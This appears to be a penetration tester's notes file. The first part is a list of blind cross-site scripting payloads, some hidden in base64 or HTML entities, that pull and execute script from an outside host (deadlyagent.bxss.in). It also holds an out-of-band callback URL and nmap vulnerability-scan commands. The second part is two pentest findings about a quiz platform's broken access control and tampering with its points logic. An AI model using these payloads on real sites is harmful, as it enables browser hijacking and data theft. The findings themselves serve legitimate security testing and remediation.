javascript:eval('var a=document.createElement('script');a.src='https://deadlyagent.bxss.in';document.body.appendChild(a)')
"><script src=https://deadlyagent.bxss.in></script>
"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZGVhZGx5YWdlbnQuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61; autofocus>
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZGVhZGx5YWdlbnQuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61 onerror=eval(atob(this.id))>
"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZGVhZGx5YWdlbnQuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61;>
"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZGVhZGx5YWdlbnQuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61;>
"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;deadlyagent.bxss.in&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//deadlyagent.bxss.in");a.send();</script>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//deadlyagent.bxss.in");a.send();</script>
<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZGVhZGx5YWdlbnQuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61 onerror=eval(atob(this.id))>
<script src=https://deadlyagent.bxss.in></script>
https://e5kmcagyqscb83fr25my5xz2etkk8awz.oastify.com
nmap -p 443 -sV -sC --script "ssl-* and http-* and vuln" --script-args http.useragent="Mozilla/5.0",http.max-cache-size=100 --version-all -Pn -T4 -oA nmap_443_full <target>
nmap -p 443 -sV --script ssl-enum-ciphers,ssl-cert,http-methods,http-headers,http-title,vulners -T4 -Pn <target>





-------------------------------------------------------
Quiz Answer Disclosure via Predictable Card Number Enumeration
Description:
The test team observed that the application exposes correct quiz answers through a predictable and insecure API endpoint.

Observation:
In the current scenario, the test team found that submitting a correct answer triggers a request to the endpoint /api/card/<card number>, which responds with the correct answer for the quiz card. By modifying and incrementing the card number value from 0 to 250, the team was able to retrieve correct answers for all quiz cards on the platform. No authentication or rate limiting was in place to restrict this enumeration.

Risk Impact:
The attacker can enumerate quiz cards and retrieve correct answers in bulk, bypassing the challenge of the platform. This allows them to score maximum points without real knowledge, compromise gamified learning integrity, and potentially disrupt fair competition among users.

Severity: High
Recommendations:
It is recommended to:
Avoid returning correct answers in API responses unless explicitly required by post-submission logic, and only after proper server-side validation.
Restrict access to the /api/card/<card number> endpoint by enforcing user-specific access checks or authorization.
Use unpredictable, non-sequential identifiers (UUIDs) to prevent easy enumeration of card resources.
Implement rate limiting and monitoring on this endpoint to detect and mitigate abuse.
Apply access control and response filtering across all endpoints that return sensitive information or learning content.

OWASP Top 10 2021 Mapping: A01:2021 – Broken Access Control
(Also relevant to A06:2021 – Vulnerable and Outdated Components if no auth is enforced)

CVSS 3.1 Score: 8.3 (High)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

CWE Reference:
CWE-639: Authorization Bypass Through User-Controlled Key
--------------------------------------------------
Issue Name: Business Logic Bypass via URL Manipulation in Quiz Points API
Description:
The test team observed that the application is vulnerable to business logic bypass through insecure client-side control of reward logic.

Observation:
In the current scenario, the test team found that when submitting an incorrect answer in a quiz, a request is triggered to the endpoint /api/<userid>/remove/points, which deducts 20 points as expected. By intercepting this request and changing the word remove to add in the URL, the server processed it and awarded 20 points instead of deducting them. This confirms that the action logic (add/remove) is handled insecurely through client-side data and can be tampered with.

Risk Impact:
The attacker can exploit this flaw to manipulate quiz scoring logic, reward themselves for incorrect answers, and inflate their total score unfairly. This could lead to misuse of gamified systems, fraud in competitions, and loss of integrity in user rankings or reward systems.

Severity: High
Recommendations:
It is recommended to:

Enforce strict server-side validation of the business logic based on quiz results instead of trusting client-controlled URL paths or parameters.

Remove reliance on endpoint structure (e.g., add/remove) and handle point changes based on server-side evaluation of the quiz outcome.

Validate quiz answer correctness server-side and only then trigger point deduction or reward logic.

Ensure these controls are applied across all endpoints that involve scoring, reward logic, or gamification features.

OWASP Top 10 2021 Mapping: A01:2021 – Broken Access Control
(Also touches on A04:2021 – Insecure Design due to flawed logic architecture)

CVSS 3.1 Score: 8.2 (High)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H

CWE Reference:
CWE-840: Business Logic Errors
